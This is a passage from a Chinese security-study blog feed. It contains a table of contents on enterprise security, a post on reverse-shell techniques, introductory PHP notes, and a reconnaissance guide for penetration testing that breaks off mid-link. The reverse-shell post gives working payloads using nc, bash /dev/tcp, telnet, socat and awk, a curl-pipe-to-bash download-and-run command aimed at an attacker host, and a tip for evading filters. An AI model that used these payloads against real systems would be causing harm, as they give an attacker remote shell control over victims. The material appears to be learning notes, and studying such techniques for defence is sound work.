title="第六章 企业安全"></a>第六章 企业安全</h2><h3 id="第一部分-基线管理与安全配置提升"><a href="#第一部分-基线管理与安全配置提升" class="headerlink" title="第一部分 基线管理与安全配置提升"></a>第一部分 基线管理与安全配置提升</h3><h4 id="6-1-1-基线管理概述"><a href="#6-1-1-基线管理概述" class="headerlink" title="6.1.1 基线管理概述"></a>6.1.1 基线管理概述</h4><h4 id="6-1-2-windows安全配置"><a href="#6-1-2-windows安全配置" class="headerlink" title="6.1.2 windows安全配置"></a>6.1.2 windows安全配置</h4><h4 id="6-1-3-linux安全配置"><a href="#6-1-3-linux安全配置" class="headerlink" title="6.1.3 linux安全配置"></a>6.1.3 linux安全配置</h4><h4 id="6-1-4-apache安全配置"><a href="#6-1-4-apache安全配置" class="headerlink" title="6.1.4 apache安全配置"></a>6.1.4 apache安全配置</h4><h4 id="6-1-5-mariadb安全配置"><a href="#6-1-5-mariadb安全配置" class="headerlink" title="6.1.5 mariadb安全配置"></a>6.1.5 mariadb安全配置</h4><h4 id="6-1-6-mongodb安全配置"><a href="#6-1-6-mongodb安全配置" class="headerlink" title="6.1.6 mongodb安全配置"></a>6.1.6 mongodb安全配置</h4><h3 id="第二部分-安全事件管理处置"><a href="#第二部分-安全事件管理处置" class="headerlink" title="第二部分 安全事件管理处置"></a>第二部分 安全事件管理处置</h3><h4 id="6-2-1-应急响应简介"><a href="#6-2-1-应急响应简介" class="headerlink" title="6.2.1 应急响应简介"></a>6.2.1 应急响应简介</h4><h4 id="6-2-2事件分级分类"><a href="#6-2-2事件分级分类" class="headerlink" title="6.2.2事件分级分类"></a>6.2.2事件分级分类</h4><h4 id="6-2-3-安全事件处置思路指导"><a href="#6-2-3-安全事件处置思路指导" class="headerlink" title="6.2.3 安全事件处置思路指导"></a>6.2.3 安全事件处置思路指导</h4><h4 id="6-2-4-安全事件处置案例分析"><a href="#6-2-4-安全事件处置案例分析" class="headerlink" title="6.2.4 安全事件处置案例分析"></a>6.2.4 安全事件处置案例分析</h4><h4 id="6-2-5-windows应急响应"><a href="#6-2-5-windows应急响应" class="headerlink" title="6.2.5 windows应急响应"></a>6.2.5 windows应急响应</h4><h4 id="6-2-6-windows应急响应工具与日志"><a href="#6-2-6-windows应急响应工具与日志" class="headerlink" title="6.2.6 windows应急响应工具与日志"></a>6.2.6 windows应急响应工具与日志</h4><h4 id="6-2-7-linux应急响应"><a href="#6-2-7-linux应急响应" class="headerlink" title="6.2.7 linux应急响应"></a>6.2.7 linux应急响应</h4></iframe>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深信服 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹Shell方法</title>
      <link href="/2024/09/19/fan-dan-shell-fang-fa/"/>
      <url>/2024/09/19/fan-dan-shell-fang-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="反弹Shell方法"><a href="#反弹Shell方法" class="headerlink" title="反弹Shell方法"></a>反弹Shell方法</h1><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ul><li>由于防火墙等的控制访问策略，客户端无法访问服务端，但服务端可以向外网发起请求</li><li>IP会动态变化，攻击机无法直接连接</li><li>向局域网中的主机散播木马病毒等，网络环境未知的情况下</li><li>服务端的AV对正向连接的流量检测非常严格，但是对出网流量校验不足</li></ul><h2 id="反弹方式"><a href="#反弹方式" class="headerlink" title="反弹方式"></a>反弹方式</h2><h3 id="Netcat（nc）"><a href="#Netcat（nc）" class="headerlink" title="Netcat（nc）"></a>Netcat（nc）</h3><ol><li>攻击机监听端口</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>受害机执行反弹命令</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 攻击机IP 攻击机监听端口 -e /bin/bash</span><br></pre></td></tr></tbody></table></figure><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><ol><li>攻击机监听端口</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>在受害机执行：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload1：</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机Port 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">payload2：</span><br><span class="line"></span><br><span class="line">bash -c "bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机Port 0&gt;&amp;1"</span><br></pre></td></tr></tbody></table></figure><p>payload分析</p><p>Bash 是一个命令处理器，通常运行于文本窗口中，并能执行用户直接输入的命令。</p><ul><li>bash -c<br>  后加Linux命令，如：<code>bash -c whoami</code></li><li>bash -i<br>  产生一个bash交互环境</li><li>&gt;&amp;<br>  将联合符号前面的内容与后面相结合，然后一起重定向给后者。</li><li><code>/dev/tcp/攻击机IP/攻击机Port</code><br>  在Linux中，一切内容皆为文件，这里是与目标主机的指定端口建立一个TCP连接</li><li>0&gt;&amp;1<br>  将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容</li></ul><p>首先，Bash生成一个交互环境，在与目标主机建立TCP连接，再重定向TCP连接，然后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，最后得到一个交互式的shell。</p><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><p>方法一：</p><ol><li>攻击机监听端口</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>受害机执行，前提是受害机上要有telnet服务</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod a p; telnet 攻击机IP 攻击机Port 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></tbody></table></figure><ol><li><code>mknod a p;</code>：这部分命令使用 <code>mknod</code> 创建一个名为 <code>a</code> 的命名管道（FIFO）。命名管道是一种特殊类型的文件，可以用于进程间通信。</li><li><code>telnet 攻击机IP 攻击机Port</code>：这里的 <code>telnet</code> 命令用于连接到指定的 IP 地址和端口（在这里是攻击机的 IP 和端口）。此部分将建立一个与远程主机的 Telnet 连接。</li><li><code>0&lt;a</code>：这个部分将命名管道 <code>a</code> 的内容作为标准输入（file descriptor 0）。也就是说，任何通过管道 <code>a</code> 发送的数据都会被作为输入传递给 Telnet 连接。</li><li><code>| /bin/bash</code>：这一部分表示将前面的命令的输出通过管道（<code>|</code>）传递给 <code>/bin/bash</code>，这意味着将执行由 Telnet 连接接收的命令。</li><li><code>1&gt;a</code>：这部分将标准输出（file descriptor 1）重定向到命名管道 <code>a</code>，即任何输出都会发送到管道 <code>a</code>，从而可以通过管道将输出再次传递。</li></ol><p>​这段代码的核心目的是创建一个后门，允许恶意用户通过 Telnet 远程控制目标机器。在这种情况下，远程攻击者能够发送命令，并看到执行结果</p><p>方法二：</p><ol><li>攻击机需要开启两个端口监听，一个用于输入命令，一个用于回显命令执行的结果</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l Your_cmd_Port</span><br><span class="line">nc -l Your_result_Port</span><br></pre></td></tr></tbody></table></figure><ol><li>目标主机触发</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 攻击者IP 攻击者cmd_Port | /bin/bash | telnet 攻击者IP 攻击者result_Port</span><br></pre></td></tr></tbody></table></figure><p>此外，在一些工控设备中，常常由 telnetd 程序，也可以利用其来开启正向的shell</p><ol><li>受害机开启监听</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnetd -p Your_Port -l /bin/sh</span><br></pre></td></tr></tbody></table></figure><ol><li>攻击主机正向连接</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet Your_IP Your_Port</span><br></pre></td></tr></tbody></table></figure><h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><p>Socat是Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，但功能比 netcat强大。<code>socat</code> 是一个强大的网络工具，用于创建双向数据流通道</p><ol><li>攻击机开启监听，可以使用原来的nc，也可以一样使用 socat</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:2333 -</span><br></pre></td></tr></tbody></table></figure><ol><li>受害机中触发，前提：受害机上要有socat服务</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-connect:Your_IP:Your_Port exec:'bash -li',pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></tbody></table></figure><ol><li><strong>tcp-connect:Your_IP:Your_Port</strong>: 这一部分表示 <code>socat</code> 将尝试通过 TCP 连接到指定的 IP 地址 (<code>Your_IP</code>) 和端口号 (<code>Your_Port</code>)。这也是命令进行网络交互的入口。</li><li><strong>exec:’bash -li’</strong>: 这里的 <code>exec</code> 用于执行一个新的程序。<code>bash -li</code> 启动一个交互式的 Bash shell（<code>-i</code> 表示交互式，<code>-l</code> 表示登陆 shell），这使得连接者得以在目标系统上直接与 shell 交互。</li><li><strong>pty</strong>: 这个选项用于请求一个伪终端 (pseudo-terminal)，以便能够在交互式环境中使用 shell 特性，比如输入和输出。</li><li><strong>stderr</strong>: 这一部分表示将标准错误输出 (stderr) 也重定向，以确保错误信息也能够通过这个连接返回。</li><li><strong>setsid</strong>: 这个选项用于创建一个新的会话，通常用于完全断开与控制终端的连接，这是在创建守护进程时常用的，因此在某些情况下可以确保其正常运行。</li><li><strong>sigint</strong>: 此选项用于支持对 SIGINT 信号的处理，通常这是通过 Ctrl+C 发送的，可以使用户能够中断运行的 shell。</li><li><strong>sane</strong>: 此选项用于重置终端设置到“合理”的状态，确保环境变量和终端属性在交互式会话中是适当的。</li></ol><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。在众多的Linux发行版本中，都会预装这个应用程序。</p><ol><li>攻击机开启监听</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></tbody></table></figure><ol><li>受害机触发 payload</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk 'BEGIN{s="/inet/tcp/0/Your_IP/Your_Listening_Port";for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}'</span><br></pre></td></tr></tbody></table></figure><ol><li><strong>BEGIN</strong>: 这部分在 <code>awk</code> 脚本开始执行之前运行。</li><li><strong>s=”/inet/tcp/0/Your_IP/Your_Listening_Port”</strong>: 这里定义了一个变量 <code>s</code>，它是一个 TCP 连接的描述，其中 <code>Your_IP</code> 和 <code>Your_Listening_Port</code> 应该被替换为要连接的实际 IP 地址和端口号。具体来说，这个字符串告诉 <code>awk</code> 使用 TCP 协议进行连接。</li><li><strong>for(;s|&amp;getline c;close(c))</strong>: 这部分代码的意思是在尝试连接 <code>s</code> 指定的地址，如果成功，<code>getline</code> 将会读取数据并将其存入变量 <code>c</code>。<code>close(c)</code> 表示关闭与 <code>c</code> 的连接。</li><li><strong>while(c|getline)print|&amp;s</strong>: 这是一个循环，用于不断读取从连接 <code>c</code> 接收到的数据，并将数据打印到标准输出。<code>print|&amp;s</code> 将输出重定向至 <code>s</code>（即连接的另一个端）。</li><li><strong>close(s)</strong>: 最后，关闭连接 <code>s</code>。</li></ol><h3 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h3><ol><li>在攻击机上建立HTTP服务，同时将 payload 写进文件</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 新建payload</span><br><span class="line">cd /tmp</span><br><span class="line">echo 'bash -c "bash -i &gt;&amp; /dev/tcp/Your_IP/Your_Port 0&gt;&amp;1"' &gt; index.html</span><br><span class="line"></span><br><span class="line"># 开启Web服务</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></tbody></table></figure><ol><li>在攻击机上开启nc监听，跟前文提及的一样</li><li>在目标主机触发payload</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://攻击机IP|bash</span><br></pre></td></tr></tbody></table></figure><p>适用场景是绕过某些安全校验，如某个站点存在 rce，但是此时对用户的输入存在校验，导致无法直接使用payload，这里用 Curl 先将payload下载下来，再通过管道符号传递给 Bash 程序。</p><blockquote><p>TIPS：此处的IP可以是任意的可解析格式，如十进制、十六进制等等，可参考 SSRF 中的IP过滤绕过</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习</title>
      <link href="/2024/09/12/php-xue-xi/"/>
      <url>/2024/09/12/php-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP学习"><a href="#PHP学习" class="headerlink" title="PHP学习"></a>PHP学习</h1><h2 id="1-PHP简述"><a href="#1-PHP简述" class="headerlink" title="1.PHP简述"></a>1.PHP简述</h2><ul><li>PHP：超文本预处理器</li><li>通用开源脚本语言</li></ul><p>php的使用：</p><ol><li>PHP 可以生成动态页面内容</li><li>PHP 可以创建、打开、读取、写入、关闭服务器上的文件</li><li>PHP 可以收集表单数据</li><li>PHP 可以发送和接收 cookies</li><li>PHP 可以添加、删除、修改您的数据库中的数据</li><li>PHP 可以限制用户访问您的网站上的一些页面</li><li>PHP 可以加密数据</li></ol><h2 id="2-基本语法格式"><a href="#2-基本语法格式" class="headerlink" title="2.基本语法格式"></a>2.基本语法格式</h2><ul><li><p>PHP 脚本以 &lt;?php 开始，以 ?&gt; 结束</p></li><li><p>static的关键字的使用</p><ul><li><p>当一个函数完成时，它的所有变量通常都会被删除。</p></li><li><p>然而，有时候您希望某个局部变量不要被删除。</p></li><li><p>要做到这一点，请在您第一次声明变量时使用 static 关键字：</p></li></ul></li></ul> <figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>{</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$n</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="variable">$n</span>++;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"调用了一次"</span>.<span class="variable">$n</span>.<span class="string">"\n"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="title function_ invoke__">test</span>();<span class="title function_ invoke__">test</span>();<span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="3-数据类型、常量以及字符串"><a href="#3-数据类型、常量以及字符串" class="headerlink" title="3.数据类型、常量以及字符串"></a>3.数据类型、常量以及字符串</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="keyword">array</span>(<span class="string">"A"</span>,<span class="string">"B"</span>,<span class="string">"C"</span>);<span class="comment">//数组类型</span></span><br><span class="line"><span class="variable">$g</span> = <span class="keyword">array</span>(<span class="string">'x'</span>=&gt;<span class="number">1</span>,<span class="string">'b'</span>=&gt;<span class="string">'2'</span>);<span class="comment">//字典类型</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">obj</span></span>{<span class="comment">//php对象的声明</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>{ }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">obj</span>();<span class="comment">//对象实例化类型</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="comment">//Array([0]=&gt;1 [1]=&gt;1 [2]=&gt;xxx)//数组输出</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$g</span>);</span><br><span class="line"><span class="comment">//Array([x]=&gt;1 [b]=&gt;2)//字典输出</span></span><br></pre></td></tr></tbody></table></figure><ul><li>对象、数组、字典需要var_dump()或print_r()才能输出，其余可用echo</li></ul><p>常量:</p><p>设置常量，使用 define() 函数，函数语法如下：</p><p>bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )</p><p>　　该函数有三个参数:</p><p>name：必选参数，常量名称，即标志符。</p><p>value：必选参数，常量的值。</p><p>case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">"CL"</span>, <span class="string">"这是一个全局常量"</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> CL; <span class="comment">// 默认false，变量名区分大小写</span></span><br><span class="line"><span class="keyword">echo</span> cl; <span class="comment">// true不区分大小写</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>预定义常量:</p><p>PHP预定义了许多常量，这些常量无需使用define()函数定义，可直接在程序中使用。下面列举了一些常用的PHP预定义常量。</p><p>（1）__FILE__(FILE前后分别是两个下画线)：当前正在处理的脚本文件名，若使用在一个被引用的文件中（include或require），那么　　它的值就是被引用的文件，而不是引用它的那个文件。</p><p>（2）__LINE__(LINE前后分别是两个下画线)：正在处理的脚本文件的当前行数。</p><p>（3）PHP_VERSION：当前PHP预处理器的版本，如5.4.16。</p><p>（4）PHP_OS: PHP所在的操作系统的类型。如Linux。</p><p>（5）TRUE：表示逻辑真。FALSE：表示逻辑假。NULL：表示没有值或值不确定。</p><p>（6）DIRECTORY_SEPARATOR: 表示目录分隔符，UNIX或Linux操作系统环境时的值为“ / ”, Window操作系统环境时的值为 “ \ ”。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__FILE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__LINE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_VERSION;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_OS;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> DIRECTORY_SEPARATOR;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>整型：</p><p>$a = 120 //十进制</p><p>$a = 0b110 //二进制</p><p>$a = 0120   //八进制</p><p>$a = 0x120  //十六进制</p><p>// 使用echo输出时。默认输出为<strong>十进制</strong></p><p>decbin() // 十进制转二进制</p><p>decoct() // 十进制转八进制</p><p>dechex() // 十进制转十六进制</p><p>bindec() // 二进制转十进制0b二进制-&gt;echo-&gt;自动转整型</p><p>bin2hex() //二进制转十六进制  </p><p>字符串:</p><p>双引号：解析字符串中的变量</p><p>单引号：不解析变量，当成字符串输出</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span>=<span class="string">'xmh'</span>;</span><br><span class="line"><span class="comment">//双引号里面有变量会输出变量的值,变量两侧有空格</span></span><br><span class="line"><span class="variable">$str</span> =<span class="string">"这是 <span class="subst">$name</span> 的学习笔记"</span>;</span><br><span class="line"><span class="comment">//单引号如果里面有变量都作为一个字符串处理</span></span><br><span class="line"><span class="variable">$str1</span> =<span class="string">'这是 $name 的学习笔记'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str1</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>strlen：返回字符串长度</p><p>trim：去除两端空格</p><p>strpos（$str，‘字符串’）：查找字符串首次出现位置</p><p>substr（$str，1，10）：字符串截取</p><p>str_replace(‘1’,’0’,$a)：字符串替换</p><p>md5($a)：md5加密</p><p>$a[0]：通过下标取字符的值</p><p>遍历字符串：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++){</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="4-数组"><a href="#4-数组" class="headerlink" title="4.数组"></a>4.数组</h2><p>在 PHP 中，有三种类型的数组：</p><p><strong>数值数组</strong> - 带有数字 ID 键的数组</p><p><strong>关联数组</strong> - 带有指定的键的数组，每个键关联一个值</p><p><strong>多维数组</strong> - 包含一个或多个数组的数组</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">数组的声明:</span><br><span class="line"><span class="variable">$array1</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);<span class="comment">//简单的数组</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);<span class="comment">//count()返回数组的长度</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2024/09/11/xin-xi-shou-ji/"/>
      <url>/2024/09/11/xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>​信息收集是渗透测试的前期主要工作，是非常重要的环节，收集足够多的信息才能方便接下来的测试，信息收集主要是收集网站的<strong>域名信息、子域名信息、目标网站信息、目标网站真实IP、敏感/目录文件、开放端口和中间件信息</strong>等等。通过各种渠道和手段尽可能收集到多的关于这个站点的信息，有助于我们更多的去找到渗透点，突破口。</p><h2 id="2-信息收集分类"><a href="#2-信息收集分类" class="headerlink" title="2.信息收集分类"></a>2.信息收集分类</h2><ol><li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li><li>网站指纹识别（包括，cms，cdn，证书等） dns记录</li><li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li><li>子域名收集，旁站，C段等</li><li>google hacking针对化搜索，word/电子表格/pdf文件，中间件版本，弱口令扫描等</li><li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li><li>传输协议，通用漏洞，exp，github源码等</li></ol><h2 id="3-常见方法"><a href="#3-常见方法" class="headerlink" title="3.常见方法"></a>3.常见方法</h2><ol><li>whois查询</li></ol><p>​域名在注册的时候，需要填入个人或者企业信息，如果没有设置隐藏属性可以查询出来，通过备案号查询个人或者企业信息，也可以whois反查注册人、邮箱、电话、机构，反查更多得域名和需要得信息。</p><ol start="2"><li>收集子域名</li></ol><p>域名分为根域名和子域名</p><p>xxx.com 根域名，也叫顶级域名</p><p><a href="http://www.xxx.com子域名,也叫二级域名/">www.xxx.com子域名，也叫二级域名</a></p><p><a href="http://www.abc.xxx.com/">www.abc.xxx.com</a> 子域名，也叫三级域名 四级如此类推</p><ol start="3"><li>端口扫描</li></ol><p>服务器需要开放服务，就必须开启端口，常见的端口是TCP 和UDP两种类型 </p><p>范围 0-65535 通过扫得到的端口，访问服务 规划下一步渗透。</p><ol start="4"><li>查找真实IP</li></ol><p>企业的网站，为了提高访问速度，或者避免黑客攻击，用了<strong>CDN</strong>服务，用了CDN之后真实服务器IP会被隐藏。</p><ol start="5"><li>探测旁站及C段</li></ol><p>旁站：一个服务器上有多个网站 通过ip查询服务器上的网站</p><p>C段：查找同一个网段，服务器上的网站。可以找到同样网站的类型和服务器，也可以获取同段服务器进行下一步渗透。</p><p>C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器</p><ol start="6"><li>网络空间搜索引擎</li></ol><p>通过这些引擎查找网站或者服务器的信息，进行下一步渗透。</p><ol start="7"><li>扫描敏感目录/文件</li></ol><p>通过扫描目录和文件，大致了解网站的结构，获取突破点，比如后台，文件备份，上传点。</p><ol start="8"><li>指纹识别</li></ol><p>获取网站的版本，属于那些cms管理系统，查找漏洞exp，下载cms进行代码审计。</p><h2 id="4-在线whois查询"><a href="#4-在线whois查询" class="headerlink" title="4.在线whois查询"></a>4.在线whois查询</h2><p>通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等，因为有些网站信息查得到，有些网站信息查不到，所以推荐以下信息比较全的查询网站，直接输入目标站点即可查询到相关信息。</p><p>–站长之家域名WHOIS信息查询地址 <a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站网域名WHOIS信息查询地址 <a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>腾讯云域名WHOIS信息查询地址 <a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p><p>–美橙互联域名WHOIS信息查询地址 <a href="https://whois.cndns.com/">https://whois.cndns.com/</a></p><p>爱名网域名WHOIS信息查询地址 <a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a></p><p>易名网域名WHOIS信息查询地址 <a href="https://whois.ename.net/">https://whois.ename.net/</a></p><p>中国万网域名WHOIS信息查询地址 <a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></p><p>西部数码域名WHOIS信息查询地址 <a href="https://whois.west.cn/">https://whois.west.cn/</a></p><p>新网域名WHOIS信息查询地址 <a href="http://whois.xinnet.com/domain/whois/index.jsp">http://whois.xinnet.com/domain/whois/index.jsp</a></p><p>纳网域名WHOIS信息查询地址 <a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a></p><p>中资源域名WHOIS信息查询地址 <a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a></p><p>三五互联域名WHOIS信息查询地址 <a href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a></p><p>新网互联域名WHOIS信息查询地址 <a href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a></p><p>国外WHOIS信息查询地址 <a 